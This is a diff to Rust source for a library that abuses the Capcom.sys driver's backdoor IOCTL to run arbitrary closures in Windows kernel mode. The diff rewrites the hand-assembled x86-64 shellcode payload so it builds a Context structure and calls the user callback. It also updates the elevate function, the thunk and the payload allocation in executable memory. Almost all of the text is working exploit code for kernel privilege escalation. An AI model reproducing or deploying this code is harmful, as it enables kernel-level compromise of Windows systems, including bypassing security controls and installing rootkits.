@@ -698,28 +698,37 @@ unsafe fn enable_privilege(privilege_name: &[u16]) -> bool {
 
 //----------------------------------------------------------------
 
-static PAYLOAD: [u8; 48] = [
+static PAYLOAD: [u8; 64] = [
 	// Pointer to payload code, required by Capcom backdoor
 	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-	// Pointer to the user callback, called after setup
+	// Pointer to the user callback
 	// movabs rax, user_fn
 	0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-	// Pointer to the user data context
-	// movabs rcx, user_data
+	// Pointer to the user data
+	// movabs rdx, user_data
 	0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-	// Capcom keeps its IRP pointer in rbx
-	// mov r8, rbx
-	0x49, 0x89, 0xD8,
-	// Get the Capcom.sys image base from the return address
-	// mov r9, qword ptr [rsp]
-	// sub r9, 0x577
-	0x4C, 0x8B, 0x0C, 0x24,
-	0x49, 0x81, 0xE9, 0x77, 0x05, 0x00, 0x00,
-	// Jump to the user callback
-	// jmp rax
-	0xFF, 0xE0,
-	// Padding to make the payload 3 * 16 bytes (for no reason really...)
-	0xCC, 0xCC, 0xCC, 0xCC,
+	// Get the Capcom image base from the return address
+	// mov r8, qword ptr [rsp]
+	// sub r8, 0x577
+	0x4C, 0x8B, 0x04, 0x24,
+	0x49, 0x81, 0xE8, 0x77, 0x05, 0x00, 0x00,
+	// Create and fill in Context structure
+	// push r8
+	// push rbx
+	// push rcx
+	0x41, 0x50,
+	0x53,
+	0x51,
+	// Call the user callback with Context argument
+	// mov rcx, rsp
+	// call rax
+	0x48, 0x89, 0xE1,
+	0xFF, 0xD0,
+	// Cleanup and return
+	0x48, 0x83, 0xC4, 0x18,
+	0xC3,
+	// Padding
+	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC
 ];
 
 /// Capcom device.
@@ -737,7 +746,7 @@ impl Device {
 			let device = CreateFileW(CAPCOM_DEVICE.as_ptr(), FILE_ALL_ACCESS, FILE_SHARE_READ, ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
 			if device != INVALID_HANDLE_VALUE {
 				let payload = VirtualAlloc(ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) as *mut u8;
-				*(payload as *mut [u8; 48]) = PAYLOAD;
+				*(payload as *mut [u8; 64]) = PAYLOAD;
 				Ok(Device { device, payload })
 			}
 			else {
@@ -757,15 +766,14 @@ impl Device {
 	/// This covers a surprising number of things; panicking, i/o, ...
 	///
 	/// Be careful and have fun!
-	pub unsafe fn elevate<F: FnMut(Context)>(&self, mut f: F) -> bool {
+	pub unsafe fn elevate<F: FnMut(&mut Context)>(&self, mut f: F) -> bool {
 		// Generate the thunk
 		self.codegen(Self::elevate_thunk::<F> as usize, &mut f as *mut _ as usize);
 		// Invoke the IOCTL
 		self.ioctl()
 	}
-	unsafe extern "system" fn elevate_thunk<F: FnMut(Context)>(get_system_routine_address: MmGetSystemRoutineAddressFn, user_data: *mut F, irp: usize, capcom_base: usize) {
-		let ctx = Context { get_system_routine_address, irp, capcom_base };
-		(*user_data)(ctx);
+	unsafe extern "system" fn elevate_thunk<F: FnMut(&mut Context)>(ctx: *mut Context, user_data: *mut F) {
+		(*user_data)(&mut *ctx);
 	}
 
 	/// Generate the payload code.
@@ -808,10 +816,13 @@ pub type MmGetSystemRoutineAddressFn = unsafe extern "system" fn(name: PUNICODE_
 ///
 /// The closure passed to [`Device::elevate`](struct.Device.html#method.elevate) receives this context as an argument.
 #[derive(Copy, Clone)]
+#[repr(C)]
 pub struct Context {
 	/// [`MmGetSystemRoutineAddress`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-mmgetsystemroutineaddress).
 	pub get_system_routine_address: MmGetSystemRoutineAddressFn,
+	/// Pointer to [IRP structure](https://msdn.microsoft.com/en-us/library/windows/hardware/ff550694.aspx).
 	pub irp: usize,
+	/// Base address of Capcom driver.
 	pub capcom_base: usize,
 }
 
